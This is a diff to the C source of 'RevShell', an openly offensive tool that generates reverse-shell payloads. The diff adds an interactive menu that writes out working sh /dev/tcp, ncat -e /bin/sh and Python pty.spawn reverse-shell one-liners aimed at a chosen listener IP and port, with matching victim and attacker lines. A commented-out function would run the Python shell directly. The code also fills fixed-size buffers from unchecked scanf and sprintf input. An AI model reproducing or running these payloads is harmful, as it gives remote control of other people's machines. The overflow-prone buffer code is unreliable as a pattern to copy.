@@ -29,6 +29,12 @@ char * ip_port;
 char * ip_addr;
 char * argument_ip;
 
+// FrameWork ************************************************* FrameWork \\ 
+
+
+void framework();
+
+
 // Main Function  *******************************************   Main Function\\ 
 
 int main(int argc , char* argv[])
@@ -37,8 +43,13 @@ int main(int argc , char* argv[])
 
 	if (argc < 2 || argc == 1)
 	{
-		printf("CatShell version 0.0.3\n\nUse -h or --help for help\n");
+		printf("RevShell version 0.0.4\n\nUse -h or --help for help\n");
 	}
+	else if ((strcmp(argv[1],"--framework"))==0 && argc == 2 )
+	{
+		framework();
+	}
+
 	else if ((strcmp(argv[1],"-h"))==0 || (strcmp(argv[1],"--help"))==0 )
 	{
 		// (strcmp(argv[1],"--type"))==0 && argc == 3
@@ -404,7 +415,7 @@ int main(int argc , char* argv[])
 
 void PrintHelp()
 {
-	printf("Usage : ./catshell [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-o --output output file\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n\n--ip specify an ip address <bash , ncat , python > later updates\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
+	printf("Usage : ./revshell [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n\n--ip specify an ip address <bash , ncat , python > later updates\n--framework\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
 }
 
 void GetPhp()
@@ -443,6 +454,181 @@ void GetPython()
 	system("echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<ip>\",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_shell.txt \n");
 }
 
+void framework()
+{
+    system("clear");
+	printf(R"EOF(
+    ____           _____ __         ____
+   / __ \___ _   _/ ___// /_  ___  / / /
+  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
+ / _, _/  __/ |/ /__/ / / / /  __/ / /  
+/_/ |_|\___/|___/____/_/ /_/\___/_/_/   
+
+*---------------------------------------*
+
+    RevShell 0.0.4 FrameWork 
+
+*---------------------------------------*
+
+[ 1 ] Download RevShells File
+
+[ 2 ] Create Fast RevShells
+
+[ 3 ] Instant RevShell 
+
+[ 4 ] Info
+			)EOF");
+    int framework_choice;
+    printf("\nrv > ");
+    scanf("%d" , &framework_choice);
+    switch(framework_choice)
+    {
+        case 1: 
+        	system("clear");
+			printf(R"EOF(
+    ____           _____ __         ____
+   / __ \___ _   _/ ___// /_  ___  / / /
+  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
+ / _, _/  __/ |/ /__/ / / / /  __/ / /  
+/_/ |_|\___/|___/____/_/ /_/\___/_/_/   
+
+*---------------------------------------*
+
+    RevShell 0.0.4 FrameWork : Download 
+
+*---------------------------------------*
+
+[ 1 ] PHP RevShell 
+
+[ 2 ] C RevShell
+
+[ 3 ] C# RevShell
+
+[ 4 ] Python RevShell
+
+[ 5 ] Shell RevShell
+
+        		)EOF");
+			int download_option;
+			printf("\nrv > ");
+			scanf("%d",&download_option);
+			switch(download_option)
+			{
+				case 1:
+					GetPhp();
+					break;
+				case 2:
+					GetC();
+					break;
+				case 3:
+					GetCsharp();
+					break;
+				case 4:
+					GetPython();
+					break;
+				case 5:
+					GetShell();
+					break;
+				default:
+					printf("\n\nPlease try again choosing from 1 ==> 5\n\nUnexpected Error");
+					break;
+
+			}
+
+
+
+        	break;
+        case 2:
+			system("clear");
+			char ip_addr_framework[15];
+			char port_framework[5];
+			printf("Listening IP : ");
+			scanf("%s",ip_addr_framework);
+			printf("Listening Port : ");
+			scanf("%s",port_framework);
+			system("clear");
+			ip_addr = ip_addr_framework;
+			ip_port = port_framework;
+			printf(R"EOF(
+    ____           _____ __         ____
+   / __ \___ _   _/ ___// /_  ___  / / /
+  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
+ / _, _/  __/ |/ /__/ / / / /  __/ / /  
+/_/ |_|\___/|___/____/_/ /_/\___/_/_/   
+
+*---------------------------------------*
+
+    RevShell 0.0.4 FrameWork : Create
+
+*---------------------------------------*
+
+Listen IP : %s
+Listen PORT : %s
+
+[ 1 ] Shell RevShell
+
+[ 2 ] Python RevShell
+
+[ 3 ] Ncat RevShell
+
+			)EOF",ip_addr_framework,port_framework);
+			int create_option_framework;
+			printf("\nrv > ");
+			scanf("%d",&create_option_framework);
+			switch(create_option_framework)
+			{
+				case 1:
+					GetShell_Full_Cred();
+					break;
+				case 2:
+					GetPython_Full_Cred();
+					break;
+				case 3:
+					GetNcat_Full_Cred();
+					break;
+				default:
+					printf("\n\nUnexpected Error");
+					break;
+			}
+		case 3:
+			printf("\nIn development.");
+			break;
+		case 4:
+			system("clear");
+			printf(R"EOF(
+    ____           _____ __         ____
+   / __ \___ _   _/ ___// /_  ___  / / /
+  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
+ / _, _/  __/ |/ /__/ / / / /  __/ / /  
+/_/ |_|\___/|___/____/_/ /_/\___/_/_/   
+
+*---------------------------------------*
+
+    RevShell 0.0.4 FrameWork : Info
+
+*---------------------------------------*
+
+Developer : MrEbrahimXD
+
+Version : 0.0.4
+
+*--------------------------------------------------------------------------*
+RevShell project is an open-source utility that decreases the time taken to 
+perform or download a reverse shell code
+*--------------------------------------------------------------------------*
+
+- Don't use this tool for illegal activities , Use it at your own risk , Meant for Ethical Hackers
+
+					)EOF");
+				printf("\n");
+				break;
+		default:
+        	printf("Unexpected Error");
+        	break;
+
+    }
+}
+
 
 // ****************************************************************************************************** \\ 
 // IP Functions ---------------------------------------------------------------------------- IP Functions \\ 
@@ -455,7 +641,7 @@ void GetPhp_Full_Cred()
 
 void GetShell_Full_Cred()
 {
-	char cmd[192];
+	char cmd[194];
 	printf("[*] Made shell_revshell.txt UDP and TCP with %s:%s\n" , ip_addr , ip_port );
 	sprintf(cmd , "echo \"Victim : sh -i >& /dev/tcp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_udp.txt \n\n" , ip_addr , ip_port , ip_port , ip_addr , ip_port , ip_port);
 	system(cmd);
@@ -469,7 +655,7 @@ void GetCsharp_Full_Cred()
 
 void GetNcat_Full_Cred()
 {
-	char cmd[86];
+	char cmd[87];
 	printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
 	sprintf(cmd , "echo \"Victim : ncat -e /bin/sh %s %s \nListener : ncat -lnvp %s\" > ncat_help.txt \n" , ip_addr , ip_port , ip_port );
 	system(cmd);
@@ -482,10 +668,17 @@ void GetC_Full_Cred()
 
 void GetPython_Full_Cred()
 {
-	char cmd[159];
+	char cmd[160];
 	printf("[*] Python : python_revshell.txt made with %s:%s \n" , ip_addr , ip_port);
 	sprintf(cmd , "echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_revshell.txt \n" , ip_addr , ip_port );
 	system(cmd);
 }
 
+// Instant Spawn ******************* Instant Spawn  \\ 
 
+//void instant_python()
+//{
+//    char cmd[];
+//    sprintf(cmd , "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'" , ip_addr , ip_port);
+//    system(cmd);
+//}
